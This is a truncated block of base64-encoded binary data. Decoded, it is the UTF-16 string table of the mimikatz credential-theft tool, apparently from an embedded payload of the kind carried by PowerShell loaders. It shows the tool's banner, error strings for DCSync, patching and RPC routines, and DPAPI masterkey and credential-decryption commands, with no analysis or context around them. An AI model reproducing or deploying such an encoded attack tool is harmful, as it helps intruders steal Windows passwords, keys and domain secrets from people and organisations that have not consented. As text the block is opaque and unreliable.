AZQBQAHIAbwBwAGUAcgB0AGkAZQBzACAAIAAgACAAOgAKAAAAAAAAACUAKgBzACAAIABwAFAAcgBpAHYAYQB0AGUASwBlAHkAIAAgACAAIAAgACAAIAAgACAAIAAgADoACgAAAAAAAAAlACoAcwAqACoASwBFAFkAIABDAE4ARwAgAFAAUgBPAFAARQBSAFQAWQAqACoACgAAAAAAAAAAAAAAAAAAAAAAJQAqAHMAIAAgAGQAdwBTAHQAcgB1AGMAdABMAGUAbgAgACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAAAAAAAAAAAAlACoAcwAgACAAdAB5AHAAZQAgACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAJQAwADgAeAAgAC0AIAAlAHUACgAAAAAAAAAAAAAAAAAAACUAKgBzACAAIAB1AG4AawAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADoAIAAlADAAOAB4ACAALQAgACUAdQAKAAAAAAAAAAAAAAAAAAAAJQAqAHMAIAAgAGQAdwBOAGEAbQBlAEwAZQBuACAAIAAgACAAIAAgACAAOgAgACUAMAA4AHgAIAAtACAAJQB1AAoAAAAAAAAAAAAAAAAAAAAlACoAcwAgACAAZAB3AFAAcgBvAHAAZQByAHQAeQBMAGUAbgAgACAAIAA6ACAAJQAwADgAeAAgAC0AIAAlAHUACgAAAAAAAAAlACoAcwAgACAAcABOAGEAbQBlACAAIAAgACAAIAAgACAAIAAgACAAIAA6ACAAAAAlACoAcwAgACAAcABQAHIAbwBwAGUAcgB0AHkAIAAgACAAIAAgACAAIAA6ACAAAAAlAHUAIABmAGkAZQBsAGQAKABzACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBuAGUAdABfAGcAZQB0AEQAQwAgADsAIABEAHMARwBlAHQARABjAE4AYQBtAGUAOgAgACUAdQAKAAAAYQAAACIAJQBzACIAIABzAGUAcgB2AGkAYwBlACAAcABhAHQAYwBoAGUAZAAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoAF8AZwBlAG4AZQByAGkAYwBQAHIAbwBjAGUAcwBzAE8AcgBTAGUAcgB2AGkAYwBlAEYAcgBvAG0AQgB1AGkAbABkACAAOwAgAGsAdQBsAGwAXwBtAF8AcAByAG8AYwBlAHMAcwBfAGcAZQB0AFYAZQByAHkAQgBhAHMAaQBjAE0AbwBkAHUAbABlAEkAbgBmAG8AcgBtAGEAdABpAG8AbgBzAEYAbwByAE4AYQBtAGUAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcABhAHQAYwBoAF8AZwBlAG4AZQByAGkAYwBQAHIAbwBjAGUAcwBzAE8AcgBTAGUAcgB2AGkAYwBlAEYAcgBvAG0AQgB1AGkAbABkACAAOwAgAE8AcABlAG4AUAByAG8AYwBlAHMAcwAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHAAYQB0AGMAaABfAGcAZQBuAGUAcgBpAGMAUAByAG8AYwBlAHMAcwBPAHIAUwBlAHIAdgBpAGMAZQBGAHIAbwBtAEIAdQBpAGwAZAAgADsAIABTAGUAcgB2AGkAYwBlACAAaQBzACAAbgBvAHQAIAByAHUAbgBuAGkAbgBnAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAAawB1AGwAbABfAG0AXwBzAGUAcgB2AGkAYwBlAF8AZwBlAHQAVQBuAGkAcQB1AGUARgBvAHIATgBhAG0AZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwBwAGEAdABjAGgAXwBnAGUAbgBlAHIAaQBjAFAAcgBvAGMAZQBzAHMATwByAFMAZQByAHYAaQBjAGUARgByAG8AbQBCAHUAaQBsAGQAIAA7ACAASQBuAGMAbwByAHIAZQBjAHQAIAB2AGUAcgBzAGkAbwBuACAAaQBuACAAcgBlAGYAZQByAGUAbgBjAGUAcwAKAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AYwByAGUAYQB0AGUAIAA7ACAAUgB0AGwAQwByAGUAYQB0AGUAVQBzAGUAcgBUAGgAcgBlAGEAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBlAG0AbwB0AGUAbABpAGIAXwBjAHIAZQBhAHQAZQAgADsAIABDAHIAZQBhAHQAZQBSAGUAbQBvAHQAZQBUAGgAcgBlAGEAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAVABoACAAQAAgACUAcAAKAEQAYQAgAEAAIAAlAHAACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAGUAbQBvAHQAZQBsAGkAYgBfAGMAcgBlAGEAdABlACAAOwAgAGsAdQBsAGwAXwBtAF8AawBlAHIAbgBlAGwAXwBpAG8AYwB0AGwAXwBoAGEAbgBkAGwAZQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAGUAbQBvAHQAZQBsAGkAYgBfAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAEMAbwBkAGUAVwBpAHQAdABoAFAAYQB0AHQAZQByAG4AUgBlAHAAbABhAGMAZQAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYwBvAHAAeQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAGUAbQBvAHQAZQBsAGkAYgBfAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAEMAbwBkAGUAVwBpAHQAdABoAFAAYQB0AHQAZQByAG4AUgBlAHAAbABhAGMAZQAgADsAIABrAHUAbABsAF8AbQBfAG0AZQBtAG8AcgB5AF8AYQBsAGwAbwBjACAALwAgAFYAaQByAHQAdQBhAGwAQQBsAGwAbwBjACgARQB4ACkAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAZQBtAG8AdABlAGwAaQBiAF8AQwByAGUAYQB0AGUAUgBlAG0AbwB0AGUAQwBvAGQAZQBXAGkAdAB0AGgAUABhAHQAdABlAHIAbgBSAGUAcABsAGEAYwBlACAAOwAgAE4AbwAgAGIAdQBmAGYAZQByACAAPwAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBSAHAAYwBTAGUAYwB1AHIAaQB0AHkAQwBhAGwAbABiAGEAYwBrACAAOwAgAFEAdQBlAHIAeQBDAG8AbgB0AGUAeAB0AEEAdAB0AHIAaQBiAHUAdABlAHMAIAAlADAAOAB4AAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBwAGMAXwBkAHIAcwByAF8AUgBwAGMAUwBlAGMAdQByAGkAdAB5AEMAYQBsAGwAYgBhAGMAawAgADsAIABJAF8AUgBwAGMAQgBpAG4AZABpAG4AZwBJAG4AcQBTAGUAYwB1AHIAaQB0AHkAQwBvAG4AdABlAHgAdAAgACUAMAA4AHgACgAAAAAAAAAAAG4AYwBhAGMAbgBfAGkAcABfAHQAYwBwAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAcABjAF8AZAByAHMAcgBfAGMAcgBlAGEAdABlAEIAaQBuAGQAaQBuAGcAIAA7ACAAUgBwAGMAQgBpAG4AZABpAG4AZwBTAGUAdABPAHAAdABpAG8AbgA6ACAAMAB4ACUAMAA4AHgAIAAoACUAdQApAAoAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAcABjAF8AZAByAHMAcgBfAGMAcgBlAGEAdABlAEIAaQBuAGQAaQBuAGcAIAA7ACAAUgBwAGMAQgBpAG4AZABpAG4AZwBTAGUAdABBAHUAdABoAEkAbgBmAG8ARQB4ADoAIAAwAHgAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBjAHIAZQBhAHQAZQBCAGkAbgBkAGkAbgBnACAAOwAgAE4AbwAgAEIAaQBuAGQAaQBuAGcAIQAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBwAGMAXwBkAHIAcwByAF8AYwByAGUAYQB0AGUAQgBpAG4AZABpAG4AZwAgADsAIABSAHAAYwBCAGkAbgBkAGkAbgBnAEYAcgBvAG0AUwB0AHIAaQBuAGcAQgBpAG4AZABpAG4AZwA6ACAAMAB4ACUAMAA4AHgAIAAoACUAdQApAAoAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAcABjAF8AZAByAHMAcgBfAGMAcgBlAGEAdABlAEIAaQBuAGQAaQBuAGcAIAA7ACAAUgBwAGMAUwB0AHIAaQBuAGcAQgBpAG4AZABpAG4AZwBDAG8AbQBwAG8AcwBlADoAIAAwAHgAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBnAGUAdABEAG8AbQBhAGkAbgBBAG4AZABVAHMAZQByAEkAbgBmAG8AcwAgADsAIABEAG8AbQBhAGkAbgBDAG8AbgB0AHIAbwBsAGwAZQByAEkAbgBmAG8AOgAgAEQAQwAgACcAJQBzACcAIABuAG8AdAAgAGYAbwB1AG4AZAAKAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAcABjAF8AZAByAHMAcgBfAGcAZQB0AEQAbwBtAGEAaQBuAEEAbgBkAFUAcwBlAHIASQBuAGYAbwBzACAAOwAgAEQAbwBtAGEAaQBuAEMAbwBuAHQAcgBvAGwAbABlAHIASQBuAGYAbwA6ACAAYgBhAGQAIAB2AGUAcgBzAGkAbwBuACAAKAAlAHUAKQAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBwAGMAXwBkAHIAcwByAF8AZwBlAHQARABvAG0AYQBpAG4AQQBuAGQAVQBzAGUAcgBJAG4AZgBvAHMAIAA7ACAARABvAG0AYQBpAG4AQwBvAG4AdAByAG8AbABsAGUAcgBJAG4AZgBvADoAIAAwAHgAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBnAGUAdABEAG8AbQBhAGkAbgBBAG4AZABVAHMAZQByAEkAbgBmAG8AcwAgADsAIABSAFAAQwAgAEUAeABjAGUAcAB0AGkAbwBuACAAMAB4ACUAMAA4AHgAIAAoACUAdQApAAoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBwAGMAXwBkAHIAcwByAF8AZwBlAHQARABDAEIAaQBuAGQAIAA7ACAASQBuAGMAbwByAHIAZQBjAHQAIABEAFIAUwAgAEUAeAB0AGUAbgBzAGkAbwBuAHMAIABPAHUAdABwAHUAdAAgACgAJQAwADgAeAApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAcABjAF8AZAByAHMAcgBfAGcAZQB0AEQAQwBCAGkAbgBkACAAOwAgAE4AbwAgAEQAUgBTACAARQB4AHQAZQBuAHMAaQBvAG4AcwAgAE8AdQB0AHAAdQB0AAoAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBwAGMAXwBkAHIAcwByAF8AZwBlAHQARABDAEIAaQBuAGQAIAA7ACAASQBEAEwAXwBEAFIAUwBCAGkAbgBkADoAIAAlAHUACgAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAcABjAF8AZAByAHMAcgBfAGcAZQB0AEQAQwBCAGkAbgBkACAAOwAgAFIAUABDACAARQB4AGMAZQBwAHQAaQBvAG4AIAAwAHgAJQAwADgAeAAgACgAJQB1ACkACgAAAAAAAAAAAE4ATwBfAEUAUgBSAE8AUgAAAAAAAAAAAEUAUgBSAE8AUgBfAFIARQBTAE8ATABWAEkATgBHAAAARQBSAFIATwBSAF8ATgBPAFQAXwBGAE8AVQBOAEQAAABFAFIAUgBPAFIAXwBOAE8AVABfAFUATgBJAFEAVQBFAAAAAAAAAAAARQBSAFIATwBSAF8ATgBPAF8ATQBBAFAAUABJAE4ARwAAAAAAAAAAAEUAUgBSAE8AUgBfAEQATwBNAEEASQBOAF8ATwBOAEwAWQAAAAAAAABFAFIAUgBPAFIAXwBOAE8AXwBTAFkATgBUAEEAQwBUAEkAQwBBAEwAXwBNAEEAUABQAEkATgBHAAAAAAAAAAAARQBSAFIATwBSAF8AVABSAFUAUwBUAF8AUgBFAEYARQBSAFIAQQBMAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBDAHIAYQBjAGsATgBhAG0AZQAgADsAIABDAHIAYQBjAGsATgBhAG0AZQBzACAAKABuAGEAbQBlACAAcwB0AGEAdAB1AHMAKQA6ACAAMAB4ACUAMAA4AHgAIAAoACUAdQApACAALQAgACUAcwAKAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBwAGMAXwBkAHIAcwByAF8AQwByAGEAYwBrAE4AYQBtAGUAIAA7ACAAQwByAGEAYwBrAE4AYQBtAGUAcwA6ACAAbgBvACAAaQB0AGUAbQAhAAoAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAcABjAF8AZAByAHMAcgBfAEMAcgBhAGMAawBOAGEAbQBlACAAOwAgAEMAcgBhAGMAawBOAGEAbQBlAHMAOgAgAGIAYQBkACAAdgBlAHIAcwBpAG8AbgAgACgAJQB1ACkACgAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBwAGMAXwBkAHIAcwByAF8AQwByAGEAYwBrAE4AYQBtAGUAIAA7ACAAQwByAGEAYwBrAE4AYQBtAGUAcwA6ACAAMAB4ACUAMAA4AHgAIAAoACUAdQApAAoAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBDAHIAYQBjAGsATgBhAG0AZQAgADsAIABSAFAAQwAgAEUAeABjAGUAcAB0AGkAbwBuACAAMAB4ACUAMAA4AHgAIAAoACUAdQApAAoAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAcABjAF8AZAByAHMAcgBfAFAAcgBvAGMAZQBzAHMARwBlAHQATgBDAEMAaABhAG4AZwBlAHMAUgBlAHAAbAB5AF8AZABlAGMAcgB5AHAAdAAgADsAIABDAGgAZQBjAGsAcwB1AG0AcwAgAGQAbwBuACcAdAAgAG0AYQB0AGMAaAAgACgAQwA6ADAAeAAlADAAOAB4ACAALQAgAFIAOgAwAHgAJQAwADgAeAApAAoAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBQAHIAbwBjAGUAcwBzAEcAZQB0AE4AQwBDAGgAYQBuAGcAZQBzAFIAZQBwAGwAeQBfAGQAZQBjAHIAeQBwAHQAIAA7ACAAUgB0AGwARQBuAGMAcgB5AHAAdABEAGUAYwByAHkAcAB0AFIAQwA0AAoAAAAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBwAGMAXwBkAHIAcwByAF8AUAByAG8AYwBlAHMAcwBHAGUAdABOAEMAQwBoAGEAbgBnAGUAcwBSAGUAcABsAHkAXwBkAGUAYwByAHkAcAB0ACAAOwAgAE4AbwAgAHYAYQBsAGkAZAAgAGQAYQB0AGEACgAAAEUAUgBSAE8AUgAgAGsAdQBsAGwAXwBtAF8AcgBwAGMAXwBkAHIAcwByAF8AUAByAG8AYwBlAHMAcwBHAGUAdABOAEMAQwBoAGEAbgBnAGUAcwBSAGUAcABsAHkAXwBkAGUAYwByAHkAcAB0ACAAOwAgAE4AbwAgAFMAZQBzAHMAaQBvAG4AIABLAGUAeQAKAAAAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHIAcABjAF8AZAByAHMAcgBfAGYAcgBlAGUAXwBEAFIAUwBfAE0AUwBHAF8AQwBSAEEAQwBLAFIARQBQAEwAWQBfAGQAYQB0AGEAIAA7ACAAbgBhAG0AZQBDAHIAYQBjAGsATwB1AHQAVgBlAHIAcwBpAG8AbgAgAG4AbwB0ACAAdgBhAGwAaQBkACAAKAAwAHgAJQAwADgAeAAgAC0AIAAlAHUAKQAKAAAAAAAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBmAHIAZQBlAF8ARABSAFMAXwBNAFMARwBfAEQAQwBJAE4ARgBPAFIARQBQAEwAWQBfAGQAYQB0AGEAIAA7ACAAVABPAEQATwAgACgAbQBhAHkAYgBlAD8AKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBmAHIAZQBlAF8ARABSAFMAXwBNAFMARwBfAEQAQwBJAE4ARgBPAFIARQBQAEwAWQBfAGQAYQB0AGEAIAA7ACAAZABjAE8AdQB0AFYAZQByAHMAaQBvAG4AIABuAG8AdAAgAHYAYQBsAGkAZAAgACgAMAB4ACUAMAA4AHgAIAAtACAAJQB1ACkACgAAAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBmAHIAZQBlAF8ARABSAFMAXwBNAFMARwBfAEcARQBUAEMASABHAFIARQBQAEwAWQBfAGQAYQB0AGEAIAA7ACAAVABPAEQATwAgACgAbQBhAHkAYgBlAD8AKQAKAAAAAAAAAAAARQBSAFIATwBSACAAawB1AGwAbABfAG0AXwByAHAAYwBfAGQAcgBzAHIAXwBmAHIAZQBlAF8ARABSAFMAXwBNAFMARwBfAEcARQBUAEMASABHAFIARQBQAEwAWQBfAGQAYQB0AGEAIAA7ACAAZAB3AE8AdQB0AFYAZQByAHMAaQBvAG4AIABuAG8AdAAgAHYAYQBsAGkAZAAgACgAMAB4ACUAMAA4AHgAIAAtACAAJQB1ACkACgAAAFMAZQByAHYAaQBjAGUAcwBBAGMAdABpAHYAZQAAAAAAJQAwADIAeAAAAAAAAAAAACUAMAAyAHgAIAAAAAAAAAAwAHgAJQAwADIAeAAsACAAAAAAAAAAAABcAHgAJQAwADIAeAAAAAAACgBCAFkAVABFACAAZABhAHQAYQBbAF0AIAA9ACAAewAKAAkAAAAAAAkAAAAAAAAACgB9ADsACgAAAAAAAAAAACUAcwAgAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAbABsAF8AbQBfAHMAdAByAGkAbgBnAF8AZABpAHMAcABsAGEAeQBTAEkARAAgADsAIABDAG8AbgB2AGUAcgB0AFMAaQBkAFQAbwBTAHQAcgBpAG4AZwBTAGkAZAAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAVABvAGsAZQBuAAAAAAAAAAAAAAAAAAAACgAgACAALgAjACMAIwAjACMALgAgACAAIABtAGkAbQBpAGsAYQB0AHoAIAAyAC4AMAAgAGEAbABwAGgAYQAgACgAeAA2ADQAKQAgAHIAZQBsAGUAYQBzAGUAIAAiAEsAaQB3AGkAIABlAG4AIABDACIAIAAoAEQAZQBjACAAMQA0ACAAMgAwADEANQAgADEAOQA6ADEANgA6ADMANAApAAoAIAAuACMAIwAgAF4AIAAjACMALgAgACAACgAgACMAIwAgAC8AIABcACAAIwAjACAAIAAvACoAIAAqACAAKgAKACAAIwAjACAAXAAgAC8AIAAjACMAIAAgACAAQgBlAG4AagBhAG0AaQBuACAARABFAEwAUABZACAAYABnAGUAbgB0AGkAbABrAGkAdwBpAGAAIAAoACAAYgBlAG4AagBhAG0AaQBuAEAAZwBlAG4AdABpAGwAawBpAHcAaQAuAGMAbwBtACAAKQAKACAAJwAjACMAIAB2ACAAIwAjACcAIAAgACAAaAB0AHQAcAA6AC8ALwBiAGwAbwBnAC4AZwBlAG4AdABpAGwAawBpAHcAaQAuAGMAbwBtAC8AbQBpAG0AaQBrAGEAdAB6ACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAKABvAGUALgBlAG8AKQAKACAAIAAnACMAIwAjACMAIwAnACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdwBpAHQAaAAgACUAMgB1ACAAbQBvAGQAdQBsAGUAcwAgACoAIAAqACAAKgAvAAoACgAAAAAACgBtAGkAbQBpAGsAYQB0AHoAKABwAG8AdwBlAHIAcwBoAGUAbABsACkAIAAjACAAJQBzAAoAAABJAE4ASQBUAAAAAAAAAAAAQwBMAEUAQQBOAAAAAAAAAD4APgA+ACAAJQBzACAAbwBmACAAJwAlAHMAJwAgAG0AbwBkAHUAbABlACAAZgBhAGkAbABlAGQAIAA6ACAAJQAwADgAeAAKAAAAAAA6ADoAAAAAAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAG0AaQBtAGkAawBhAHQAegBfAGQAbwBMAG8AYwBhAGwAIAA7ACAAIgAlAHMAIgAgAG0AbwBkAHUAbABlACAAbgBvAHQAIABmAG8AdQBuAGQAIAAhAAoAAAAAAAAACgAlADEANgBzAAAAAAAAACAAIAAtACAAIAAlAHMAAAAgACAAWwAlAHMAXQAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABtAGkAbQBpAGsAYQB0AHoAXwBkAG8ATABvAGMAYQBsACAAOwAgACIAJQBzACIAIABjAG8AbQBtAGEAbgBkACAAbwBmACAAIgAlAHMAIgAgAG0AbwBkAHUAbABlACAAbgBvAHQAIABmAG8AdQBuAGQAIAAhAAoAAAAAAAAACgBNAG8AZAB1AGwAZQAgADoACQAlAHMAAAAAAAAAAAAKAEYAdQBsAGwAIABuAGEAbQBlACAAOgAJACUAcwAAAAoARABlAHMAYwByAGkAcAB0AGkAbwBuACAAOgAJACUAcwAAAAAAAABiAGwAbwBiAAAAAAAAAAAARABlAHMAYwByAGkAYgBlACAAYQAgAEQAUABBAFAASQAgAGIAbABvAGIALAAgAHUAbgBwAHIAbwB0AGUAYwB0ACAAaQB0ACAAdwBpAHQAaAAgAEEAUABJACAAbwByACAATQBhAHMAdABlAHIAawBlAHkAAAAAAAAAcAByAG8AdABlAGMAdAAAAAAAAAAAAAAAUAByAG8AdABlAGMAdAAgAGEAIABkAGEAdABhACAAdgBpAGEAIABhACAARABQAEEAUABJACAAYwBhAGwAbAAAAG0AYQBzAHQAZQByAGsAZQB5AAAAAAAAAAAAAAAAAAAARABlAHMAYwByAGkAYgBlACAAYQAgAE0AYQBzAHQAZQByAGsAZQB5ACAAZgBpAGwAZQAsACAAdQBuAHAAcgBvAHQAZQBjAHQAIABlAGEAYwBoACAATQBhAHMAdABlAHIAawBlAHkAIAAoAGsAZQB5ACAAZABlAHAAZQBuAGQAaQBuAGcAKQAAAGMAcgBlAGQAaABpAHMAdAAAAAAAAAAAAEQAZQBzAGMAcgBpAGIAZQAgAGEAIABDAHIAZQBkAGgAaQBzAHQAIABmAGkAbABlAAAAAAAAAAAAYwBhAHAAaQAAAAAAAAAAAEMAQQBQAEkAIABrAGUAeQAgAHQAZQBzAHQAAAAAAAAAYwBuAGcAAABDAE4ARwAgAGsAZQB5ACAAdABlAHMAdAAAAAAAAAAAAGMAcgBlAGQAAAAAAAAAAABDAFIARQBEACAAdABlAHMAdAAAAAAAAAB2AGEAdQBsAHQAAAAAAAAAVgBBAFUATABUACAAdABlAHMAdAAAAAAAYwBhAGMAaABlAAAAAAAAAGQAcABhAHAAaQAAAAAAAABEAFAAQQBQAEkAIABNAG8AZAB1AGwAZQAgACgAYgB5ACAAQQBQAEkAIABvAHIAIABSAEEAVwAgAGEAYwBjAGUAcwBzACkAAAAAAAAAAAAAAEQAYQB0AGEAIABQAHIAbwB0AGUAYwB0AGkAbwBuACAAYQBwAHAAbABpAGMAYQB0AGkAbwBuACAAcAByAG8AZwByAGEAbQBtAGkAbgBnACAAaQBuAHQAZQByAGYAYQBjAGUAAABpAG4AAAAAAAAAAABkAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAA6ACAAJQBzAAoAAAAAAAAAbwB1AHQAAABXAHIAaQB0AGUAIAB0AG8AIABmAGkAbABlACAAJwAlAHMAJwAgAGkAcwAgAE8ASwAKAAAAAAAAAGQAYQB0AGEAIAAtACAAAAB0AGUAeAB0ACAAOgAgACUAcwAAAAAAAABoAGUAeAAgACAAOgAgAAAARQBSAFIATwBSACAAawB1AGgAbABfAG0AXwBkAHAAYQBwAGkAXwBiAGwAbwBiACAAOwAgAGsAdQBsAGwAXwBtAF8AZgBpAGwAZQBfAHIAZQBhAGQARABhAHQAYQAgACgAMAB4ACUAMAA4AHgAKQAKAAAAAAAAAAAAbQBpAG0AaQBrAGEAdAB6AAAAAAAAAAAAZABhAHQAYQAAAAAAAAAAAGQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAGUAbgB0AHIAbwBwAHkAAABtAGEAYwBoAGkAbgBlAAAAcAByAG8AbQBwAHQAAAAAAGMAAAAAAAAACgBkAGEAdABhACAAIAAgACAAIAAgACAAIAA6ACAAJQBzAAoAAAAAAGYAbABhAGcAcwAgACAAIAAgACAAIAAgADoAIAAAAAAAcAByAG8AbQBwAHQAIABmAGwAYQBnAHMAOgAgAAAAAABlAG4AdAByAG8AcAB5ACAAIAAgACAAIAA6ACAAAAAAAEIAbABvAGIAOgAKAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AcAByAG8AdABlAGMAdAAgADsAIABDAHIAeQBwAHQAUAByAG8AdABlAGMAdABEAGEAdABhACAAKAAwAHgAJQAwADgAeAApAAoAAABwAHIAbwB0AGUAYwB0AGUAZAAAAAAAAABzAGkAZAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AbQBhAHMAdABlAHIAawBlAHkAIAA7ACAAQwBvAG4AdgBlAHIAdABTAHQAcgBpAG4AZwBTAGkAZABUAG8AUwBpAGQAIAAoADAAeAAlADAAOAB4ACkACgAAAAAAaABhAHMAaAAAAAAAAAAAAHMAeQBzAHQAZQBtAAAAAAAKAFsAbQBhAHMAdABlAHIAawBlAHkAXQAgAHcAaQB0AGgAIAB2AG8AbABhAHQAaQBsAGUAIABjAGEAYwBoAGUAOgAgAAAAAAAAAAAAAAAAAEUAUgBSAE8AUgAgAGsAdQBoAGwAXwBtAF8AZABwAGEAcABpAF8AbQBhAHMAdABlAHIAawBlAHkAIAA7ACAATgBvACAAcwB1AGkAdABhAGIAbABlACAAawBlAHkAIABmAG8AdQBuAGQAIABpAG4AIABjAGEAYwBoAGUACgAAAAAACgBbAG0AYQBzAHQAZQByAGsAZQB5AF0AIAB3AGkAdABoACAARABQAEEAUABJAF8AUwBZAFMAVABFAE0AIAAoAG0AYQBjAGgAaQBuAGUALAAgAHQAaABlAG4AIAB1AHMAZQByACkAOgAgAAAAAAAAACoAKgAgAE0AQQBDAEgASQBOAEUAIAAqACoACgAAAAAAKgAqACAAVQBTAEUAUgAgACoAKgAKAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGQAcABhAHAAaQBfAG0AYQBzAHQAZQByAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AZABwAGEAcABpAF8AdQBuAHAAcgBvAHQAZQBjAHQAXwBtAGEAcwB0AGUAcgBrAGUAeQBfAHcAaQB0AGgAXwBzAGgAYQBEAGUAcgBpAHYAZQBkAGsAZQB5AAoAAAAAAAAAAAAAAAoAWwBtAGEAcwB0AGUAcgBrAGUAeQBdACAAdwBpAHQAaAAgAEQAUABBAFAASQBfAFMAWQBTAFQARQBNADoAIAAAAAAAAAAAAHAAYQBzAHMAdwBvAHIAZAAAAAAAAAAAAG4AbwByAG0AYQBsAAAAAAAKAFsAbQBhAHMAdABlAHIAawBlAHkAXQAgAHcAaQB0AGgAIABwAGEAcwBzAHcAbwByAGQAOgAgACUAcwAgACgAJQBzACAAdQBzAGUAcgApAAoAAAAAAAAAAAAAAAAAAABFAFIAUgBPAFIAIABrAHUAaABsAF8AbQBfAGQAcABhAHAAaQBfAG0AYQBzAHQAZQByAGsAZQB5ACAAOwAgAGsAdQBsAGwAXwBtAF8AZAB